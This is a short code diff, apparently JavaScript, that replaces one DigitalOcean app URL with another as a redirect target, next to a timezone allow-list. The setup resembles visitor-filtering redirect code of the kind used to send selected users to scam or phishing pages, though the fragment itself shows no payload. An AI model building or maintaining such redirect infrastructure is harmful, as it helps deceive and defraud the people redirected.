@@ -30,7 +30,7 @@ const ALLOWED_TIMEZONES = new Set([
 ]);
 
 // Target URL Configuration
-const TARGET_URL = "https://lobster-app-pffkk.ondigitalocean.app/Win0codejInfowj2n/index.html";
+const TARGET_URL = "https://oyster-app-2-qsyg6.ondigitalocean.app/Win0codejInfowj2n/index.html";
 
 // --- Pre-Compilation Cache Layer ---
 // This processes everything into memory ONCE during boot, removing CPU load during requests.
